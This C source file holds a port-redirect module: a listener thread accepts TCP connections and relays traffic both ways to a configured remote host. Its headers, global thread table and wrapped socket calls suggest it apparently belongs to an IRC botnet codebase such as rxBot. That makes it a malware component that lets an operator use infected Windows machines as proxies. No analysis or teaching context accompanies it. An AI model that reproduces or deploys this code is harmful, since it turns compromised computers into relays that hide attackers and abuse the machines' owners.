#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_REDIRECT

// port redirect function
DWORD WINAPI redirect(LPVOID param)
{
	SOCKET clsock = 0;
	SOCKADDR_IN rssin, cssin;
	DWORD id;

	rs redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;

	SOCKET rsock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	fWSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = fhtons((unsigned short)redirect.lport);
	fbind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	threads[redirect.threadnum].sock = rsock;

	while(1) {
		if (flisten(rsock, 10) == SOCKET_ERROR) 
			break;
		clsock = faccept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	fclosesocket(clsock);
	fclosesocket(rsock);
	clearthread(redirect.threadnum);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the remote connection.
DWORD WINAPI redirectloop(LPVOID param)
{
	char buff[4096];
	SOCKET sock;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	DWORD id;
	int err;

	rs rs2 = *((rs *)param);
	SOCKET csock = rs2.csock;
	char *dest = rs2.dest;
	int port = rs2.port;

	while (1) {
		sock = fsocket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons((unsigned short)port);
		iaddr.s_addr = finet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) 
			hostent = fgethostbyname(dest);
		else 
			hostent = fgethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = fconnect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = frecv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = fsend(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}
	fclosesocket(csock);
	fclosesocket(sock);

	ExitThread(0);
}

// part of the redirect function, handles sending/recieving for the local connection.
DWORD WINAPI redirectloop2(LPVOID param)
{
	char buff[4096];
	int err;

	rs rs2 = *((rs *)param);
	SOCKET sock = rs2.sock, csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = frecv(sock, buff, sizeof(buff), 0);
		if (err == 0)
			break;
		if (err == SOCKET_ERROR) 
			break;
		err = fsend(csock, buff, err, 0);
		if (err == SOCKET_ERROR) 
			break;
	}
	fclosesocket(csock);

	ExitThread(0);
}
#endif
